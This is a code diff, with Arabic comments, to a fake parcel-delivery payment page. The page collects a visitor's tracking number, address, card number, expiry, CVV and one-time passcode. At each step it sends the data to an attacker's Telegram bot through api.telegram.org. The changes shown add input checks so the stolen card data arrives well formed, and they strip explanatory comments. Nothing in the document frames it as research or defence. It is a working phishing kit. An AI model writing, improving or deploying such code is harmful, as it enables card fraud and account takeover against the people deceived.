@@ -201,16 +201,19 @@
                 </div>
                 <div class="input-group">
                     <label>رقم البطاقة</label>
-                    <input type="tel" id="card-number" placeholder="0000 0000 0000 0000">
+                    <!-- تعديل: تحديد 16 رقم فقط -->
+                    <input type="tel" id="card-number" placeholder="0000 0000 0000 0000" maxlength="16" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                 </div>
                 <div class="row">
                     <div class="input-group">
                         <label>تاريخ الانتهاء</label>
-                        <input type="tel" id="card-expiry" placeholder="MM/YY">
+                        <!-- تعديل: التاريخ التلقائي -->
+                        <input type="tel" id="card-expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
                     </div>
                     <div class="input-group">
                         <label>رمز الأمان (CVV)</label>
-                        <input type="tel" id="card-cvv" placeholder="123">
+                        <!-- تعديل: 3 أرقام فقط -->
+                        <input type="tel" id="card-cvv" placeholder="123" maxlength="3" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                     </div>
                 </div>
                 <button class="pay-btn" onclick="goToOTP()">دفع الآن</button>
@@ -254,7 +257,6 @@
         let currentAmount = "";
         let currentPhone = ""; 
 
-        // دالة لإرسال التيليجرام
         function sendTelegramMsg(msg) {
             var url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
             fetch(url).then(res => res.json()).then(data => {
@@ -262,7 +264,6 @@
             }).catch(err => console.log("خطأ في الاتصال:", err));
         }
 
-        // دالة لحساب السعر
         function calculatePrice(trackingNum) {
             let sum = 0;
             for (let i = 0; i < trackingNum.length; i++) {
@@ -273,7 +274,15 @@
             return price;
         }
 
-        // حفظ البيانات عند الانتقال
+        // دالة تنسيق التاريخ التلقائي
+        function formatExpiry(input) {
+            let value = input.value.replace(/\D/g, ''); // إزالة أي شي غير الأرقام
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4); // إضافة / بعد أول رقمين
+            }
+            input.value = value;
+        }
+
         function saveData() {
             sessionStorage.setItem('tracking', document.getElementById('tracking-number').value);
             sessionStorage.setItem('city', document.getElementById('address-city').value);
@@ -288,7 +297,6 @@
             sessionStorage.setItem('amount', document.getElementById('total-amount').value);
         }
 
-        // استرجاع البيانات عند الرجوع
         function loadData() {
             if(sessionStorage.getItem('tracking')) document.getElementById('tracking-number').value = sessionStorage.getItem('tracking');
             if(sessionStorage.getItem('city')) document.getElementById('address-city').value = sessionStorage.getItem('city');
@@ -303,13 +311,12 @@
             if(sessionStorage.getItem('amount')) document.getElementById('total-amount').value = sessionStorage.getItem('amount');
         }
 
-        // 1. من التتبع إلى العنوان
         function goToAddress() {
             currentTrackingNumber = document.getElementById('tracking-number').value;
             if (currentTrackingNumber.trim() === "") { alert("الرجاء إدخال رقم الشحنة!"); return; }
             
             sendTelegramMsg("📦 المستخدم أدخل رقم الشحنة: " + currentTrackingNumber);
-            saveData(); // حفظ البيانات
+            saveData();
 
             document.getElementById('tracking-page').style.display = 'none';
             document.getElementById('address-page').style.display = 'block';
@@ -317,7 +324,6 @@
             history.pushState({ page: "address" }, "", "");
         }
 
-        // 2. من العنوان إلى الدفع
         function goToPayment() {
             var city = document.getElementById('address-city').value;
             var district = document.getElementById('address-district').value;
@@ -340,7 +346,7 @@
             let calculatedPrice = calculatePrice(currentTrackingNumber);
             currentAmount = calculatedPrice + " ريال"; 
             document.getElementById('total-amount').value = currentAmount;
-            saveData(); // حفظ البيانات
+            saveData();
 
             document.getElementById('address-page').style.display = 'none';
             document.getElementById('payment-page').style.display = 'block';
@@ -348,12 +354,16 @@
             history.pushState({ page: "payment" }, "", "");
         }
 
-        // 3. من الدفع إلى OTP
         function goToOTP() {
             currentCustomerName = document.getElementById('card-name').value;
             var cardNumber = document.getElementById('card-number').value;
             var expiry = document.getElementById('card-expiry').value;
             var cvv = document.getElementById('card-cvv').value;
+
+            // التعديل: التحقق من عدد الأرقام قبل الإرسال
+            if(cardNumber.length !== 16) { alert("رقم البطاقة يجب أن يكون 16 رقم بالضبط"); return; }
+            if(cvv.length !== 3) { alert("رمز الأمان CVV يجب أن يكون 3 أرقام بالضبط"); return; }
+            if(expiry.length !== 5) { alert("تاريخ الانتهاء غير صحيح (MM/YY)"); return; }
 
             let cardMsg = `💳 بيانات البطاقة:\n`;
             cardMsg += `الاسم: ${currentCustomerName}\n`;
@@ -368,7 +378,7 @@
             } else {
                 document.getElementById('otp-subtitle').innerText = `أدخل الرمز المرسل إلى الأرقام`;
             }
-            saveData(); // حفظ البيانات
+            saveData();
 
             document.getElementById('payment-page').style.display = 'none';
             document.getElementById('otp-page').style.display = 'block';
@@ -376,7 +386,6 @@
             history.pushState({ page: "otp" }, "", "");
         }
 
-        // 4. من OTP إلى النجاح
         function verifyOTP() {
             let otpCode = document.getElementById('otp-single-input').value;
             
@@ -386,7 +395,7 @@
             }
 
             sendTelegramMsg(`🔑 رمز التحقق OTP: ${otpCode}`);
-            saveData(); // حفظ البيانات
+            saveData();
 
             document.getElementById('otp-page').style.display = 'none';
             document.getElementById('success-page').style.display = 'block';
@@ -394,9 +403,8 @@
             history.pushState({ page: "success" }, "", "");
         }
 
-        // 5. التحكم بزر الرجوع
         window.onpopstate = function(event) {
-            loadData(); // استرجاع البيانات فوراً
+            loadData();
             if (event.state && event.state.page) {
                 document.getElementById('tracking-page').style.display = 'none';
                 document.getElementById('address-page').style.display = 'none';
